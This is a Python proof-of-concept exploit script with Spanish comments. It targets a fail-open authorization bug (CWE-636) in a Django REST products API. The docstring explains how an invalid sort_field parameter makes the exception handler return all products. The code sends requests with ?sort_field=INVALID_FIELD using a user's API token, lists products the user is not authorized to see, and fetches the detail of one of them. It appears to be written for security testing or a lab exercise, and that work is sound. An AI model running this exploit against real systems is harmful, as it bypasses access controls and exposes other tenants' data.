"""
A10:2025 — Vuln 2: Failing open en control de acceso a productos (CWE-636)

ProductViewSet.get_queryset() envuelve la logica de autorizacion en un
try/except. Si el parametro sort_field contiene un campo inexistente en el
modelo, Django lanza FieldError de inmediato. El except captura esa excepcion
y devuelve Product.objects.all() — todos los productos sin filtrado.

Adicionalmente, UserHasProductPermission.has_object_permission llama a
_meta.get_field(sort_field) y ante FieldDoesNotExist retorna True (fail open).

Un usuario con acceso a un solo producto puede enumerar y acceder al detalle
de TODOS los productos del sistema con ?sort_field=INVALID_FIELD.

Uso:
    python A10_V2.py --host http://<HOST> --token <API_TOKEN>
"""

import argparse
import json
import urllib.error
import urllib.request


def api_get(url: str, token: str) -> tuple[int, dict | list]:
    req = urllib.request.Request(
        url,
        headers={"Authorization": f"Token {token}"},
        method="GET",
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}


def exploit(host: str, token: str) -> None:
    host = host.rstrip("/")
    products_url        = f"{host}/api/v2/products/?format=json&limit=100"
    products_bypass_url = f"{host}/api/v2/products/?format=json&limit=100&sort_field=INVALID_FIELD"

    print("\n" + "=" * 60)
    print("VULN A10-2 — CWE-636: Failing open en control de acceso")
    print("=" * 60)

    # Paso 1 — listar productos con autorizacion normal
    print("\n[1] Listando productos SIN bypass...")
    code_normal, body_normal = api_get(products_url, token)
    print(f"    HTTP {code_normal}")
    count_normal = 0
    if code_normal == 200 and isinstance(body_normal, dict):
        count_normal = body_normal.get("count", 0)
        print(f"    Productos autorizados normalmente: {count_normal}")
        for p in (body_normal.get("results") or [])[:5]:
            print(f"      id={p.get('id')}  name={p.get('name')}")
    else:
        print(f"    Error inesperado: {body_normal}")
        return

    # Paso 2 — listar productos con sort_field invalido (fail open)
    print("\n[2] Listando productos CON ?sort_field=INVALID_FIELD (bypass fail-open)...")
    code_bypass, body_bypass = api_get(products_bypass_url, token)
    print(f"    HTTP {code_bypass}")
    if code_bypass != 200:
        print(f"    Respuesta inesperada: {body_bypass}")
        return

    count_bypass = body_bypass.get("count", 0) if isinstance(body_bypass, dict) else 0
    print(f"    Productos visibles con bypass: {count_bypass}")

    if count_bypass > count_normal:
        extra = count_bypass - count_normal
        print(f"\n    [!] FAIL OPEN CONFIRMADO: {extra} producto(s) adicionales expuestos")
        normal_ids = {p["id"] for p in (body_normal.get("results") or [])}
        print("    Productos NO autorizados ahora visibles:")
        for p in (body_bypass.get("results") or []):
            if p.get("id") not in normal_ids:
                print(f"      id={p.get('id')}  name={p.get('name')}  prod_type={p.get('prod_type', {}).get('name', '?')}")

        # Paso 3 — intentar acceder al detalle del primer producto no autorizado
        extra_products = [p for p in (body_bypass.get("results") or []) if p.get("id") not in normal_ids]
        if extra_products:
            target_id = extra_products[0]["id"]
            detail_url = f"{host}/api/v2/products/{target_id}/?sort_field=INVALID_FIELD"
            print(f"\n[3] Accediendo al detalle del producto no autorizado (id={target_id})...")
            code_detail, body_detail = api_get(detail_url, token)
            print(f"    HTTP {code_detail}")
            if code_detail == 200:
                print(f"    ACCESO CONCEDIDO al producto '{body_detail.get('name')}'  <- FAILING OPEN")
                print(f"    Descripcion: {str(body_detail.get('description', ''))[:120]}")
            else:
                print(f"    HTTP {code_detail} — acceso denegado en detalle")
    elif count_bypass == count_normal:
        print(
            "\n    NOTA: el conteo es identico, lo que puede indicar que el usuario\n"
            "    tiene acceso global a todos los productos (rol superuser o global).\n"
            "    La vulnerabilidad sigue presente en el codigo — verificar con un\n"
            "    usuario de acceso restringido a un solo producto."
        )
    else:
        print("    Comportamiento inesperado — revisar manualmente.")

    print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Exploit A10 Vuln 2 — CWE-636: Failing open en control de acceso a productos"
    )
    parser.add_argument("--host", required=True, help="URL base, ej: http://host:8080")
    parser.add_argument("--token", required=True, help="API token del usuario")
    args = parser.parse_args()

    exploit(args.host, args.token)
